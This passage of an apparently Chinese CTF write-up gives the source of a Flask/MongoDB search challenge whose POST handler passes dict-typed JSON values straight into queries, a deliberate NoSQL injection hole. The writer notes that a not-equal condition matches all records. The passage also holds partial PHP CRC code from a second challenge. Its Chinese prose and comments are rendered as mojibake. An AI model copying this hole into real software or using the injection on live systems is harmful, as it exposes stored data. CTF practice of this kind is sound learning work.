</h2><h3 id="è€ƒç‚¹nosqlæ³¨å…¥">è€ƒç‚¹ï¼šNosqlæ³¨å…¥
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">jsonify</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pymongo</span> <span class="kn">import</span> <span class="n">MongoClient</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åˆ›å»ºFlaskåº”ç”¨å®ä¾‹</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿æ¥MongoDBæ•°æ®åº“</span>
</span></span><span class="line"><span class="cl"><span class="n">client</span> <span class="o">=</span> <span class="n">MongoClient</span><span class="p">(</span><span class="s2">&#34;mongodb://localhost:27017/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># é€‰æ‹©aggie_bookstoreæ•°æ®åº“</span>
</span></span><span class="line"><span class="cl"><span class="n">db</span> <span class="o">=</span> <span class="n">client</span><span class="p">[</span><span class="s1">&#39;aggie_bookstore&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–booksé›†åˆ</span>
</span></span><span class="line"><span class="cl"><span class="n">books_collection</span> <span class="o">=</span> <span class="n">db</span><span class="p">[</span><span class="s1">&#39;books&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ•°æ®æ¸…ç†å‡½æ•°ï¼Œåªä¿ç•™å­—æ¯ã€æ•°å­—å’Œç©ºæ ¼</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sanitize</span><span class="p">(</span><span class="n">input_str</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[^a-zA-Z0-9\s]&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">input_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é¦–é¡µè·¯ç”±</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æ¸²æŸ“é¦–é¡µæ¨¡æ¿ï¼Œåˆå§‹ä¸æ˜¾ç¤ºä»»ä½•ä¹¦ç±</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">books</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æœç´¢è·¯ç”±ï¼Œæ”¯æŒGETå’ŒPOSTæ–¹æ³•</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">search</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆå§‹åŒ–æŸ¥è¯¢æ¡ä»¶</span>
</span></span><span class="line"><span class="cl">    <span class="n">query</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;$and&#34;</span><span class="p">:</span> <span class="p">[]}</span>
</span></span><span class="line"><span class="cl">    <span class="n">books</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¤„ç†GETè¯·æ±‚</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è·å–æŸ¥è¯¢å‚æ•°å¹¶å»é™¤ä¸¤ç«¯ç©ºæ ¼</span>
</span></span><span class="line"><span class="cl">        <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;author&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># æ¸…ç†è¾“å…¥æ•°æ®</span>
</span></span><span class="line"><span class="cl">        <span class="n">title_clean</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">author_clean</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">author</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœæœ‰æ ‡é¢˜æ¡ä»¶ï¼Œæ·»åŠ åˆ°æŸ¥è¯¢</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">title_clean</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;$eq&#34;</span><span class="p">:</span> <span class="n">title_clean</span><span class="p">}})</span>  <span class="c1"># ä½¿ç”¨ä¸¥æ ¼ç›¸ç­‰åŒ¹é…</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœæœ‰ä½œè€…æ¡ä»¶ï¼Œæ·»åŠ åˆ°æŸ¥è¯¢</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">author_clean</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;author&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;$eq&#34;</span><span class="p">:</span> <span class="n">author_clean</span><span class="p">}})</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœæœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">books</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">books_collection</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># è¿”å›æ¸²æŸ“åçš„æ¨¡æ¿å’ŒæŸ¥è¯¢ç»“æœ</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">books</span><span class="o">=</span><span class="n">books</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¤„ç†POSTè¯·æ±‚</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ£€æŸ¥Content-Typeæ˜¯å¦ä¸ºapplication/json</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">content_type</span> <span class="o">==</span> <span class="s1">&#39;application/json&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># å¼ºåˆ¶è§£æJSONæ•°æ®</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># è·å–titleå’Œauthorå‚æ•°</span>
</span></span><span class="line"><span class="cl">                <span class="n">title</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">author</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;author&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="c1"># å¤„ç†titleå‚æ•°</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œè¿›è¡Œæ¸…ç†</span>
</span></span><span class="line"><span class="cl">                    <span class="n">title</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="n">title</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># å¦‚æœæ˜¯å­—å…¸ï¼Œç›´æ¥ä½¿ç”¨ï¼ˆå¯èƒ½å­˜åœ¨NoSQLæ³¨å…¥æ¼æ´ï¼‰</span>
</span></span><span class="line"><span class="cl">                    <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="n">title</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># å¤„ç†authorå‚æ•°</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">author</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">author</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;author&#34;</span><span class="p">:</span> <span class="n">author</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;author&#34;</span><span class="p">:</span> <span class="n">author</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># å¦‚æœæœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">books</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">books_collection</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># è¿”å›JSONæ ¼å¼çš„æŸ¥è¯¢ç»“æœ</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">                        <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="n">b</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">),</span> 
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;author&#34;</span><span class="p">:</span> <span class="n">b</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;author&#34;</span><span class="p">),</span> 
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;description&#34;</span><span class="p">:</span> <span class="n">b</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;description&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">books</span>
</span></span><span class="line"><span class="cl">                    <span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># å¦‚æœæ²¡æœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œè¿”å›é”™è¯¯</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Empty query&#34;</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># å¤„ç†å¼‚å¸¸æƒ…å†µ</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}),</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># ä¸æ”¯æŒçš„Content-Type</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Unsupported Content-Type&#34;</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># å¯åŠ¨Flaskåº”ç”¨</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">)</span>  <span class="c1"># ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£çš„8000ç«¯å£</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œ</p>
<p><img src="/p/2025-nss-4th/image-20250824110353230.png"
	width="1248"
	height="383"
	srcset="/p/2025-nss-4th/image-20250824110353230_hu_5a80094294c6ec99.png 480w, /p/2025-nss-4th/image-20250824110353230_hu_47cd3ab2734c9e9a.png 1024w"
	loading="lazy"
	
		alt="image-20250824110353230"
	
	
		class="gallery-image" 
		data-flex-grow="325"
		data-flex-basis="782px"
	
></p>
<p>**è¡¨ç¤ºâ€œtitle ä¸ç­‰äºç©ºå­—ç¬¦ä¸²â€ï¼Œå³åŒ¹é…æ‰€æœ‰æ–‡æ¡£ï¼**ä¸è¡Œè¯•è¯•</p>
<img src="image-20250824111617957.png" alt="image-20250824111617957" style="zoom:50%;" />
<p><a class="link" href="https://xz.aliyun.com/news/9363"  target="_blank" rel="noopener"
    >Nosql æ³¨å…¥ä»é›¶åˆ°ä¸€-å…ˆçŸ¥ç¤¾åŒº</a></p>
<h2 id="ezcrc">EzCRC
</h2><p>è¦æ±‚POSTä¸keyå†…å®¹ä¸åŒï¼Œé•¿åº¦ç›¸åŒï¼ŒCRC8å’ŒCRC16ç›¸åŒçš„pass</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">compute_crc16</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$checksum</span> <span class="o">=</span> <span class="mh">0xFFFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$checksum</span> <span class="o">^=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$checksum</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$checksum</span> <span class="o">=</span> <span class="p">((</span><span class="nv">$checksum</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$checksum</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$checksum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">calculate_crc8</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="nv">$crc8_table</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span>
